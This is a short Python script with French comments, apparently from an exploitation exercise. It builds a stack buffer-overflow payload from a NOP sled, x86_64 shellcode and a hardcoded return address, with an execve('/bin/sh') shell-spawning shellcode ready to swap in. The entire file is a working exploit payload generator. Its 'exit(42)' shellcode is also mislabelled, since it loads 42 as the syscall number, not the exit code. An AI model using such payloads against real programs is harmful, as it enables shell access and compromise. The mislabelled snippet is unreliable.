#!/usr/bin/env python3
import sys

# Shellcode x86_64 execve("/bin/sh")
shellcode = b"\x48\x31\xd2\x48\x31\xf6\x50\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"

# Shellcode pour exit(42) - 7 octets
exit_shellcode = b"\x48\x31\xc0\xb0\x2a\x0f\x05"  # xor rax,rax ; mov al,42 ; syscall (exit(42))




# SHELLCODE_A_UTILISER = shellcode      # pour un shell
SHELLCODE_A_UTILISER = exit_shellcode   # pour exit(42)


ret_addr = 0x7fffffffe220
ret_bytes = ret_addr.to_bytes(8, 'little')

TARGET_LEN = 88


nop_count = TARGET_LEN - len(SHELLCODE_A_UTILISER) - len(ret_bytes)

if nop_count < 0:
    print("Shellcode + adresse trop longs !", file=sys.stderr)
    sys.exit(1)


payload = b"\x90" * nop_count + SHELLCODE_A_UTILISER + ret_bytes


sys.stdout.buffer.write(payload)